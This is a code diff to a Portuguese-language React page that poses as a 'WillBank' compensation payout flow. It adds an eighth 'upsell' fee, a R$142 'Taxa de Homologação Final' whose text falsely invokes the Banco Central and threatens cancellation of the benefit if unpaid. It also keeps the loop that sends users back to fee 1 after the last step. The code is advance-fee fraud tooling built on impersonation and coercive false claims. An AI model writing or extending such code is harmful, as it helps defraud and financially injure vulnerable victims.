@@ -44,6 +44,11 @@ const UPSELLS = [
     title: "Taxa de Finalização",
     description: "Última etapa para conclusão do processo e liberação definitiva da sua indenização.",
   },
+  {
+    valor: 142.00,
+    title: "Taxa de Homologação Final",
+    description: "ATENÇÃO: Esta é a taxa obrigatória de homologação junto ao Banco Central. Sem o pagamento desta taxa, seu benefício será CANCELADO e você NÃO receberá nenhum valor. Esta é a última etapa para garantir o recebimento da sua indenização.",
+  },
 ];
 
 const Upsell = () => {
@@ -53,7 +58,7 @@ const Upsell = () => {
   
   // Parse step number (1-7), default to 1. Handle NaN case.
   const parsedStep = parseInt(step || "1", 10);
-  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 7);
+  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 8);
   const currentIndex = stepNumber - 1;
   const currentUpsell = UPSELLS[currentIndex];
 
@@ -91,11 +96,11 @@ const Upsell = () => {
       protocolo,
     };
 
-    if (stepNumber < 7) {
+    if (stepNumber < 8) {
       // Navigate to next upsell page
       navigate(buildUrlWithUtm(`/upsell/${stepNumber + 1}`), { state: stateData });
     } else {
-      // After upsell 7, go back to upsell 1
+      // After upsell 8, go back to upsell 1
       navigate(buildUrlWithUtm("/upsell/1"), { state: stateData });
     }
   };
@@ -106,7 +111,7 @@ const Upsell = () => {
     <div className="min-h-screen min-h-[100dvh] bg-background flex flex-col">
       <WillBankHeader 
         userName={cpfData.nome.split(' ')[0].toUpperCase()} 
-        breadcrumb={`Benefício > Indenização > Etapa ${stepNumber}/7`}
+        breadcrumb={`Benefício > Indenização > Etapa ${stepNumber}/8`}
       />
 
       <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
@@ -119,7 +124,7 @@ const Upsell = () => {
           protocolo={protocolo || `WB${Date.now()}`}
           onPaymentConfirmed={handlePaymentConfirmed}
           stepNumber={stepNumber}
-          totalSteps={7}
+          totalSteps={8}
         />
       </main>
 
